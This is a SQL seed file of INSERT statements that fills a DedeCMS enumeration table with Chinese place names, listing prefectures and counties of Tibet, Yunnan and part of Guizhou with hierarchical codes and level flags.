INSERT INTO dede_sys_enum VALUES ('19592', '噶尔县', '13506.3', 'nativeplace', '13506', '2');
INSERT INTO dede_sys_enum VALUES ('19591', '札达县', '13506.2', 'nativeplace', '13506', '2');
INSERT INTO dede_sys_enum VALUES ('19590', '普兰县', '13506.1', 'nativeplace', '13506', '2');
INSERT INTO dede_sys_enum VALUES ('19589', '阿里地区', '13506', 'nativeplace', '13506', '1');
INSERT INTO dede_sys_enum VALUES ('19588', '尼玛县', '13505.10', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19587', '巴青县', '13505.9', 'nativeplace', '13506', '2');
INSERT INTO dede_sys_enum VALUES ('19586', '班戈县', '13505.8', 'nativeplace', '13506', '2');
INSERT INTO dede_sys_enum VALUES ('19585', '索　县', '13505.7', 'nativeplace', '13506', '2');
INSERT INTO dede_sys_enum VALUES ('19584', '申扎县', '13505.6', 'nativeplace', '13506', '2');
INSERT INTO dede_sys_enum VALUES ('19583', '安多县', '13505.5', 'nativeplace', '13506', '2');
INSERT INTO dede_sys_enum VALUES ('19582', '聂荣县', '13505.4', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19581', '比如县', '13505.3', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19580', '嘉黎县', '13505.2', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19579', '那曲县', '13505.1', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19578', '那曲地区', '13505', 'nativeplace', '13505', '1');
INSERT INTO dede_sys_enum VALUES ('19577', '岗巴县', '13504.18', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19576', '萨嘎县', '13504.17', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19575', '聂拉木县', '13504.16', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19574', '吉隆县', '13504.15', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19573', '亚东县', '13504.14', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19572', '仲巴县', '13504.13', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19571', '定结县', '13504.12', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19570', '康马县', '13504.11', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19569', '仁布县', '13504.10', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19568', '白朗县', '13504.9', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19567', '谢通门县', '13504.8', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19566', '昂仁县', '13504.7', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19565', '拉孜县', '13504.6', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19564', '萨迦县', '13504.5', 'nativeplace', '13505', '2');
INSERT INTO dede_sys_enum VALUES ('19563', '定日县', '13504.4', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19562', '江孜县', '13504.3', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19561', '南木林县', '13504.2', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19560', '日喀则市', '13504.1', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19559', '日喀则地区', '13504', 'nativeplace', '13504', '1');
INSERT INTO dede_sys_enum VALUES ('19558', '浪卡子县', '13503.12', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19557', '错那县', '13503.11', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19556', '隆子县', '13503.10', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19555', '加查县', '13503.9', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19554', '洛扎县', '13503.8', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19553', '措美县', '13503.7', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19552', '曲松县', '13503.6', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19551', '琼结县', '13503.5', 'nativeplace', '13504', '2');
INSERT INTO dede_sys_enum VALUES ('19550', '桑日县', '13503.4', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19549', '贡嘎县', '13503.3', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19548', '扎囊县', '13503.2', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19547', '乃东县', '13503.1', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19546', '山南地区', '13503', 'nativeplace', '13503', '1');
INSERT INTO dede_sys_enum VALUES ('19545', '边坝县', '13502.11', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19544', '洛隆县', '13502.10', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19543', '芒康县', '13502.9', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19542', '左贡县', '13502.8', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19541', '八宿县', '13502.7', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19540', '察雅县', '13502.6', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19539', '丁青县', '13502.5', 'nativeplace', '13503', '2');
INSERT INTO dede_sys_enum VALUES ('19538', '类乌齐县', '13502.4', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19537', '贡觉县', '13502.3', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19536', '江达县', '13502.2', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19535', '昌都县', '13502.1', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19534', '昌都地区', '13502', 'nativeplace', '13502', '1');
INSERT INTO dede_sys_enum VALUES ('19533', '墨竹工卡县', '13501.8', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19532', '达孜县', '13501.7', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19531', '堆龙德庆县', '13501.6', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19530', '曲水县', '13501.5', 'nativeplace', '13502', '2');
INSERT INTO dede_sys_enum VALUES ('19529', '尼木县', '13501.4', 'nativeplace', '13501', '2');
INSERT INTO dede_sys_enum VALUES ('19528', '当雄县', '13501.3', 'nativeplace', '13501', '2');
INSERT INTO dede_sys_enum VALUES ('19527', '林周县', '13501.2', 'nativeplace', '13501', '2');
INSERT INTO dede_sys_enum VALUES ('19526', '城关区', '13501.1', 'nativeplace', '13501', '2');
INSERT INTO dede_sys_enum VALUES ('19525', '拉萨市', '13501', 'nativeplace', '13501', '1');
INSERT INTO dede_sys_enum VALUES ('19524', '西藏自治区', '13500', 'nativeplace', '13500', '0');
INSERT INTO dede_sys_enum VALUES ('19523', '维西傈僳族自治县', '13016.3', 'nativeplace', '13016', '2');
INSERT INTO dede_sys_enum VALUES ('19522', '德钦县', '13016.2', 'nativeplace', '13016', '2');
INSERT INTO dede_sys_enum VALUES ('19521', '香格里拉县', '13016.1', 'nativeplace', '13016', '2');
INSERT INTO dede_sys_enum VALUES ('19520', '迪庆藏族自治州', '13016', 'nativeplace', '13016', '1');
INSERT INTO dede_sys_enum VALUES ('19519', '兰坪白族普米族自治县', '13015.4', 'nativeplace', '13015', '2');
INSERT INTO dede_sys_enum VALUES ('19518', '贡山独龙族怒族自治县', '13015.3', 'nativeplace', '13015', '2');
INSERT INTO dede_sys_enum VALUES ('19517', '福贡县', '13015.2', 'nativeplace', '13015', '2');
INSERT INTO dede_sys_enum VALUES ('19516', '泸水县', '13015.1', 'nativeplace', '13015', '2');
INSERT INTO dede_sys_enum VALUES ('19515', '怒江傈僳族自治州', '13015', 'nativeplace', '13015', '1');
INSERT INTO dede_sys_enum VALUES ('19514', '陇川县', '13014.5', 'nativeplace', '13015', '2');
INSERT INTO dede_sys_enum VALUES ('19513', '盈江县', '13014.4', 'nativeplace', '13014', '2');
INSERT INTO dede_sys_enum VALUES ('19512', '梁河县', '13014.3', 'nativeplace', '13014', '2');
INSERT INTO dede_sys_enum VALUES ('19511', '潞西市', '13014.2', 'nativeplace', '13014', '2');
INSERT INTO dede_sys_enum VALUES ('19510', '瑞丽市', '13014.1', 'nativeplace', '13014', '2');
INSERT INTO dede_sys_enum VALUES ('19509', '德宏傣族景颇族自治州', '13014', 'nativeplace', '13014', '1');
INSERT INTO dede_sys_enum VALUES ('19508', '鹤庆县', '13013.12', 'nativeplace', '13013', '2');
INSERT INTO dede_sys_enum VALUES ('19507', '剑川县', '13013.11', 'nativeplace', '13013', '2');
INSERT INTO dede_sys_enum VALUES ('19506', '洱源县', '13013.10', 'nativeplace', '13013', '2');
INSERT INTO dede_sys_enum VALUES ('19505', '云龙县', '13013.9', 'nativeplace', '13014', '2');
INSERT INTO dede_sys_enum VALUES ('19504', '永平县', '13013.8', 'nativeplace', '13014', '2');
INSERT INTO dede_sys_enum VALUES ('19503', '巍山彝族回族自治县', '13013.7', 'nativeplace', '13014', '2');
INSERT INTO dede_sys_enum VALUES ('19502', '南涧彝族自治县', '13013.6', 'nativeplace', '13014', '2');
INSERT INTO dede_sys_enum VALUES ('19501', '弥渡县', '13013.5', 'nativeplace', '13014', '2');
INSERT INTO dede_sys_enum VALUES ('19500', '宾川县', '13013.4', 'nativeplace', '13013', '2');
INSERT INTO dede_sys_enum VALUES ('19499', '祥云县', '13013.3', 'nativeplace', '13013', '2');
INSERT INTO dede_sys_enum VALUES ('19498', '漾濞彝族自治县', '13013.2', 'nativeplace', '13013', '2');
INSERT INTO dede_sys_enum VALUES ('19497', '大理市', '13013.1', 'nativeplace', '13013', '2');
INSERT INTO dede_sys_enum VALUES ('19496', '大理白族自治州', '13013', 'nativeplace', '13013', '1');
INSERT INTO dede_sys_enum VALUES ('19495', '勐腊县', '13012.3', 'nativeplace', '13012', '2');
INSERT INTO dede_sys_enum VALUES ('19494', '勐海县', '13012.2', 'nativeplace', '13012', '2');
INSERT INTO dede_sys_enum VALUES ('19493', '景洪市', '13012.1', 'nativeplace', '13012', '2');
INSERT INTO dede_sys_enum VALUES ('19492', '西双版纳傣族自治州', '13012', 'nativeplace', '13012', '1');
INSERT INTO dede_sys_enum VALUES ('19491', '富宁县', '13011.8', 'nativeplace', '13012', '2');
INSERT INTO dede_sys_enum VALUES ('19490', '广南县', '13011.7', 'nativeplace', '13012', '2');
INSERT INTO dede_sys_enum VALUES ('19489', '丘北县', '13011.6', 'nativeplace', '13012', '2');
INSERT INTO dede_sys_enum VALUES ('19488', '马关县', '13011.5', 'nativeplace', '13012', '2');
INSERT INTO dede_sys_enum VALUES ('19487', '麻栗坡县', '13011.4', 'nativeplace', '13011', '2');
INSERT INTO dede_sys_enum VALUES ('19486', '西畴县', '13011.3', 'nativeplace', '13011', '2');
INSERT INTO dede_sys_enum VALUES ('19485', '砚山县', '13011.2', 'nativeplace', '13011', '2');
INSERT INTO dede_sys_enum VALUES ('19484', '文山县', '13011.1', 'nativeplace', '13011', '2');
INSERT INTO dede_sys_enum VALUES ('19483', '文山壮族苗族自治州', '13011', 'nativeplace', '13011', '1');
INSERT INTO dede_sys_enum VALUES ('19482', '河口瑶族自治县', '13010.12', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19481', '绿春县', '13010.11', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19480', '金平苗族瑶族傣族自治县', '13010.10', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19479', '元阳县', '13010.9', 'nativeplace', '13011', '2');
INSERT INTO dede_sys_enum VALUES ('19478', '泸西县', '13010.8', 'nativeplace', '13011', '2');
INSERT INTO dede_sys_enum VALUES ('19477', '弥勒县', '13010.7', 'nativeplace', '13011', '2');
INSERT INTO dede_sys_enum VALUES ('19476', '石屏县', '13010.6', 'nativeplace', '13011', '2');
INSERT INTO dede_sys_enum VALUES ('19475', '建水县', '13010.5', 'nativeplace', '13011', '2');
INSERT INTO dede_sys_enum VALUES ('19474', '屏边苗族自治县', '13010.4', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19473', '蒙自县', '13010.3', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19472', '开远市', '13010.2', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19471', '个旧市', '13010.1', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19470', '红河哈尼族彝族自治州', '13010', 'nativeplace', '13010', '1');
INSERT INTO dede_sys_enum VALUES ('19469', '禄丰县', '13009.10', 'nativeplace', '13009', '2');
INSERT INTO dede_sys_enum VALUES ('19468', '武定县', '13009.9', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19467', '元谋县', '13009.8', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19466', '永仁县', '13009.7', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19465', '大姚县', '13009.6', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19464', '姚安县', '13009.5', 'nativeplace', '13010', '2');
INSERT INTO dede_sys_enum VALUES ('19463', '南华县', '13009.4', 'nativeplace', '13009', '2');
INSERT INTO dede_sys_enum VALUES ('19462', '牟定县', '13009.3', 'nativeplace', '13009', '2');
INSERT INTO dede_sys_enum VALUES ('19461', '双柏县', '13009.2', 'nativeplace', '13009', '2');
INSERT INTO dede_sys_enum VALUES ('19460', '楚雄市', '13009.1', 'nativeplace', '13009', '2');
INSERT INTO dede_sys_enum VALUES ('19459', '楚雄彝族自治州', '13009', 'nativeplace', '13009', '1');
INSERT INTO dede_sys_enum VALUES ('19458', '沧源佤族自治县', '13008.8', 'nativeplace', '13009', '2');
INSERT INTO dede_sys_enum VALUES ('19457', '耿马傣族佤族自治县', '13008.7', 'nativeplace', '13009', '2');
INSERT INTO dede_sys_enum VALUES ('19456', '双江拉祜族佤族布朗族傣族自治县', '13008.6', 'nativeplace', '13009', '2');
INSERT INTO dede_sys_enum VALUES ('19455', '镇康县', '13008.5', 'nativeplace', '13009', '2');
INSERT INTO dede_sys_enum VALUES ('19454', '永德县', '13008.4', 'nativeplace', '13008', '2');
INSERT INTO dede_sys_enum VALUES ('19453', '云　县', '13008.3', 'nativeplace', '13008', '2');
INSERT INTO dede_sys_enum VALUES ('19452', '凤庆县', '13008.2', 'nativeplace', '13008', '2');
INSERT INTO dede_sys_enum VALUES ('19451', '临翔区', '13008.1', 'nativeplace', '13008', '2');
INSERT INTO dede_sys_enum VALUES ('19450', '临沧市', '13008', 'nativeplace', '13008', '1');
INSERT INTO dede_sys_enum VALUES ('19449', '西盟佤族自治县', '13007.10', 'nativeplace', '13007', '2');
INSERT INTO dede_sys_enum VALUES ('19448', '澜沧拉祜族自治县', '13007.9', 'nativeplace', '13008', '2');
INSERT INTO dede_sys_enum VALUES ('19447', '孟连傣族拉祜族佤族自治县', '13007.8', 'nativeplace', '13008', '2');
INSERT INTO dede_sys_enum VALUES ('19446', '江城哈尼族彝族自治县', '13007.7', 'nativeplace', '13008', '2');
INSERT INTO dede_sys_enum VALUES ('19445', '镇沅彝族哈尼族拉祜族自治县', '13007.6', 'nativeplace', '13008', '2');
INSERT INTO dede_sys_enum VALUES ('19444', '景谷傣族彝族自治县', '13007.5', 'nativeplace', '13008', '2');
INSERT INTO dede_sys_enum VALUES ('19443', '景东彝族自治县', '13007.4', 'nativeplace', '13007', '2');
INSERT INTO dede_sys_enum VALUES ('19442', '墨江哈尼族自治县', '13007.3', 'nativeplace', '13007', '2');
INSERT INTO dede_sys_enum VALUES ('19441', '普洱哈尼族彝族自治县', '13007.2', 'nativeplace', '13007', '2');
INSERT INTO dede_sys_enum VALUES ('19440', '翠云区', '13007.1', 'nativeplace', '13007', '2');
INSERT INTO dede_sys_enum VALUES ('19439', '思茅市', '13007', 'nativeplace', '13007', '1');
INSERT INTO dede_sys_enum VALUES ('19438', '宁蒗彝族自治县', '13006.5', 'nativeplace', '13007', '2');
INSERT INTO dede_sys_enum VALUES ('19437', '华坪县', '13006.4', 'nativeplace', '13006', '2');
INSERT INTO dede_sys_enum VALUES ('19436', '永胜县', '13006.3', 'nativeplace', '13006', '2');
INSERT INTO dede_sys_enum VALUES ('19435', '玉龙纳西族自治县', '13006.2', 'nativeplace', '13006', '2');
INSERT INTO dede_sys_enum VALUES ('19434', '古城区', '13006.1', 'nativeplace', '13006', '2');
INSERT INTO dede_sys_enum VALUES ('19433', '丽江市', '13006', 'nativeplace', '13006', '1');
INSERT INTO dede_sys_enum VALUES ('19432', '水富县', '13005.11', 'nativeplace', '13005', '2');
INSERT INTO dede_sys_enum VALUES ('19431', '威信县', '13005.10', 'nativeplace', '13005', '2');
INSERT INTO dede_sys_enum VALUES ('19430', '彝良县', '13005.9', 'nativeplace', '13006', '2');
INSERT INTO dede_sys_enum VALUES ('19429', '镇雄县', '13005.8', 'nativeplace', '13006', '2');
INSERT INTO dede_sys_enum VALUES ('19428', '绥江县', '13005.7', 'nativeplace', '13006', '2');
INSERT INTO dede_sys_enum VALUES ('19427', '永善县', '13005.6', 'nativeplace', '13006', '2');
INSERT INTO dede_sys_enum VALUES ('19426', '大关县', '13005.5', 'nativeplace', '13006', '2');
INSERT INTO dede_sys_enum VALUES ('19425', '盐津县', '13005.4', 'nativeplace', '13005', '2');
INSERT INTO dede_sys_enum VALUES ('19424', '巧家县', '13005.3', 'nativeplace', '13005', '2');
INSERT INTO dede_sys_enum VALUES ('19423', '鲁甸县', '13005.2', 'nativeplace', '13005', '2');
INSERT INTO dede_sys_enum VALUES ('19422', '昭阳区', '13005.1', 'nativeplace', '13005', '2');
INSERT INTO dede_sys_enum VALUES ('19421', '昭通市', '13005', 'nativeplace', '13005', '1');
INSERT INTO dede_sys_enum VALUES ('19420', '昌宁县', '13004.5', 'nativeplace', '13005', '2');
INSERT INTO dede_sys_enum VALUES ('19419', '龙陵县', '13004.4', 'nativeplace', '13004', '2');
INSERT INTO dede_sys_enum VALUES ('19418', '腾冲县', '13004.3', 'nativeplace', '13004', '2');
INSERT INTO dede_sys_enum VALUES ('19417', '施甸县', '13004.2', 'nativeplace', '13004', '2');
INSERT INTO dede_sys_enum VALUES ('19416', '隆阳区', '13004.1', 'nativeplace', '13004', '2');
INSERT INTO dede_sys_enum VALUES ('19415', '保山市', '13004', 'nativeplace', '13004', '1');
INSERT INTO dede_sys_enum VALUES ('19414', '元江哈尼族彝族傣族自治县', '13003.9', 'nativeplace', '13004', '2');
INSERT INTO dede_sys_enum VALUES ('19413', '新平彝族傣族自治县', '13003.8', 'nativeplace', '13004', '2');
INSERT INTO dede_sys_enum VALUES ('19412', '峨山彝族自治县', '13003.7', 'nativeplace', '13004', '2');
INSERT INTO dede_sys_enum VALUES ('19411', '易门县', '13003.6', 'nativeplace', '13004', '2');
INSERT INTO dede_sys_enum VALUES ('19410', '华宁县', '13003.5', 'nativeplace', '13004', '2');
INSERT INTO dede_sys_enum VALUES ('19409', '通海县', '13003.4', 'nativeplace', '13003', '2');
INSERT INTO dede_sys_enum VALUES ('19408', '澄江县', '13003.3', 'nativeplace', '13003', '2');
INSERT INTO dede_sys_enum VALUES ('19407', '江川县', '13003.2', 'nativeplace', '13003', '2');
INSERT INTO dede_sys_enum VALUES ('19406', '红塔区', '13003.1', 'nativeplace', '13003', '2');
INSERT INTO dede_sys_enum VALUES ('19405', '玉溪市', '13003', 'nativeplace', '13003', '1');
INSERT INTO dede_sys_enum VALUES ('19404', '宣威市', '13002.9', 'nativeplace', '13003', '2');
INSERT INTO dede_sys_enum VALUES ('19403', '沾益县', '13002.8', 'nativeplace', '13003', '2');
INSERT INTO dede_sys_enum VALUES ('19402', '会泽县', '13002.7', 'nativeplace', '13003', '2');
INSERT INTO dede_sys_enum VALUES ('19401', '富源县', '13002.6', 'nativeplace', '13003', '2');
INSERT INTO dede_sys_enum VALUES ('19400', '罗平县', '13002.5', 'nativeplace', '13003', '2');
INSERT INTO dede_sys_enum VALUES ('19399', '师宗县', '13002.4', 'nativeplace', '13002', '2');
INSERT INTO dede_sys_enum VALUES ('19398', '陆良县', '13002.3', 'nativeplace', '13002', '2');
INSERT INTO dede_sys_enum VALUES ('19397', '马龙县', '13002.2', 'nativeplace', '13002', '2');
INSERT INTO dede_sys_enum VALUES ('19396', '麒麟区', '13002.1', 'nativeplace', '13002', '2');
INSERT INTO dede_sys_enum VALUES ('19395', '曲靖市', '13002', 'nativeplace', '13002', '1');
INSERT INTO dede_sys_enum VALUES ('19394', '安宁市', '13001.14', 'nativeplace', '13001', '2');
INSERT INTO dede_sys_enum VALUES ('19393', '寻甸回族彝族自治县', '13001.13', 'nativeplace', '13001', '2');
INSERT INTO dede_sys_enum VALUES ('19392', '禄劝彝族苗族自治县', '13001.12', 'nativeplace', '13001', '2');
INSERT INTO dede_sys_enum VALUES ('19391', '嵩明县', '13001.11', 'nativeplace', '13001', '2');
INSERT INTO dede_sys_enum VALUES ('19390', '石林彝族自治县', '13001.10', 'nativeplace', '13001', '2');
INSERT INTO dede_sys_enum VALUES ('19389', '宜良县', '13001.9', 'nativeplace', '13002', '2');
INSERT INTO dede_sys_enum VALUES ('19388', '富民县', '13001.8', 'nativeplace', '13002', '2');
INSERT INTO dede_sys_enum VALUES ('19387', '晋宁县', '13001.7', 'nativeplace', '13002', '2');
INSERT INTO dede_sys_enum VALUES ('19386', '呈贡县', '13001.6', 'nativeplace', '13002', '2');
INSERT INTO dede_sys_enum VALUES ('19385', '东川区', '13001.5', 'nativeplace', '13002', '2');
INSERT INTO dede_sys_enum VALUES ('19384', '西山区', '13001.4', 'nativeplace', '13001', '2');
INSERT INTO dede_sys_enum VALUES ('19383', '官渡区', '13001.3', 'nativeplace', '13001', '2');
INSERT INTO dede_sys_enum VALUES ('19382', '盘龙区', '13001.2', 'nativeplace', '13001', '2');
INSERT INTO dede_sys_enum VALUES ('19381', '五华区', '13001.1', 'nativeplace', '13001', '2');
INSERT INTO dede_sys_enum VALUES ('19380', '昆明市', '13001', 'nativeplace', '13001', '1');
INSERT INTO dede_sys_enum VALUES ('19379', '云南省', '13000', 'nativeplace', '13000', '0');
INSERT INTO dede_sys_enum VALUES ('19378', '三都水族自治县', '12509.12', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19377', '惠水县', '12509.11', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19376', '龙里县', '12509.10', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19375', '长顺县', '12509.9', 'nativeplace', '12510', '2');
INSERT INTO dede_sys_enum VALUES ('19374', '罗甸县', '12509.8', 'nativeplace', '12510', '2');
INSERT INTO dede_sys_enum VALUES ('19373', '平塘县', '12509.7', 'nativeplace', '12510', '2');
INSERT INTO dede_sys_enum VALUES ('19372', '独山县', '12509.6', 'nativeplace', '12510', '2');
INSERT INTO dede_sys_enum VALUES ('19371', '瓮安县', '12509.5', 'nativeplace', '12510', '2');
INSERT INTO dede_sys_enum VALUES ('19370', '贵定县', '12509.4', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19369', '荔波县', '12509.3', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19368', '福泉市', '12509.2', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19367', '都匀市', '12509.1', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19366', '黔南布依族苗族自治州', '12509', 'nativeplace', '12509', '1');
INSERT INTO dede_sys_enum VALUES ('19365', '麻江县', '12508.15', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19364', '雷山县', '12508.14', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19363', '从江县', '12508.13', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19362', '榕江县', '12508.12', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19361', '黎平县', '12508.11', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19360', '台江县', '12508.10', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19359', '剑河县', '12508.9', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19358', '锦屏县', '12508.8', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19357', '天柱县', '12508.7', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19356', '岑巩县', '12508.6', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19355', '镇远县', '12508.5', 'nativeplace', '12509', '2');
INSERT INTO dede_sys_enum VALUES ('19354', '三穗县', '12508.4', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19353', '施秉县', '12508.3', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19352', '黄平县', '12508.2', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19351', '凯里市', '12508.1', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19350', '黔东南苗族侗族自治州', '12508', 'nativeplace', '12508', '1');
INSERT INTO dede_sys_enum VALUES ('19349', '赫章县', '12507.8', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19348', '威宁彝族回族苗族自治县', '12507.7', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19347', '纳雍县', '12507.6', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19346', '织金县', '12507.5', 'nativeplace', '12508', '2');
INSERT INTO dede_sys_enum VALUES ('19345', '金沙县', '12507.4', 'nativeplace', '12507', '2');
INSERT INTO dede_sys_enum VALUES ('19344', '黔西县', '12507.3', 'nativeplace', '12507', '2');
INSERT INTO dede_sys_enum VALUES ('19343', '大方县', '12507.2', 'nativeplace', '12507', '2');
INSERT INTO dede_sys_enum VALUES ('19342', '毕节市', '12507.1', 'nativeplace', '12507', '2');
INSERT INTO dede_sys_enum VALUES ('19341', '毕节地区', '12507', 'nativeplace', '12507', '1');
INSERT INTO dede_sys_enum VALUES ('19340', '安龙县', '12506.8', 'nativeplace', '12507', '2');
INSERT INTO dede_sys_enum VALUES ('19339', '册亨县', '12506.7', 'nativeplace', '12507', '2');
INSERT INTO dede_sys_enum VALUES ('19338', '望谟县', '12506.6', 'nativeplace', '12507', '2');
INSERT INTO dede_sys_enum VALUES ('19337', '贞丰县', '12506.5', 'nativeplace', '12507', '2');
INSERT INTO dede_sys_enum VALUES ('19336', '晴隆县', '12506.4', 'nativeplace', '12506', '2');
INSERT INTO dede_sys_enum VALUES ('19335', '普安县', '12506.3', 'nativeplace', '12506', '2');
INSERT INTO dede_sys_enum VALUES ('19334', '兴仁县', '12506.2', 'nativeplace', '12506', '2');
INSERT INTO dede_sys_enum VALUES ('19333', '兴义市', '12506.1', 'nativeplace', '12506', '2');
INSERT INTO dede_sys_enum VALUES ('19332', '黔西南布依族苗族自治州', '12506', 'nativeplace', '12506', '1');
INSERT INTO dede_sys_enum VALUES ('19331', '万山特区', '12505.10', 'nativeplace', '12505', '2');
INSERT INTO dede_sys_enum VALUES ('19330', '松桃苗族自治县', '12505.9', 'nativeplace', '12506', '2');
INSERT INTO dede_sys_enum VALUES ('19329', '沿河土家族自治县', '12505.8', 'nativeplace', '12506', '2');
INSERT INTO dede_sys_enum VALUES ('19328', '德江县', '12505.7', 'nativeplace', '12506', '2');
INSERT INTO dede_sys_enum VALUES ('19327', '印江土家族苗族自治县', '12505.6', 'nativeplace', '12506', '2');
INSERT INTO dede_sys_enum VALUES ('19326', '思南县', '12505.5', 'nativeplace', '12506', '2');
INSERT INTO dede_sys_enum VALUES ('19325', '石阡县', '12505.4', 'nativeplace', '12505', '2');
INSERT INTO dede_sys_enum VALUES ('19324', '玉屏侗族自治县', '12505.3', 'nativeplace', '12505', '2');
INSERT INTO dede_sys_enum VALUES ('19323', '江口县', '12505.2', 'nativeplace', '12505', '2');
INSERT INTO dede_sys_enum VALUES ('19322', '铜仁市', '12505.1', 'nativeplace', '12505', '2');
INSERT INTO dede_sys_enum VALUES ('19321', '铜仁地区', '12505', 'nativeplace', '12505', '1');
INSERT INTO dede_sys_enum VALUES ('19320', '紫云苗族布依族自治县', '12504.6', 'nativeplace', '12505', '2');
INSERT INTO dede_sys_enum VALUES ('19319', '关岭布依族苗族自治县', '12504.5', 'nativeplace', '12505', '2');
INSERT INTO dede_sys_enum VALUES ('19318', '镇宁布依族苗族自治县', '12504.4', 'nativeplace', '12504', '2');
INSERT INTO dede_sys_enum VALUES ('19317', '普定县', '12504.3', 'nativeplace', '12504', '2');
INSERT INTO dede_sys_enum VALUES ('19316', '平坝县', '12504.2', 'nativeplace', '12504', '2');
INSERT INTO dede_sys_enum VALUES ('19315', '西秀区', '12504.1', 'nativeplace', '12504', '2');
INSERT INTO dede_sys_enum VALUES ('19314', '安顺市', '12504', 'nativeplace', '12504', '1');
INSERT INTO dede_sys_enum VALUES ('19313', '仁怀市', '12503.14', 'nativeplace', '12503', '2');
INSERT INTO dede_sys_enum VALUES ('19312', '赤水市', '12503.13', 'nativeplace', '12503', '2');
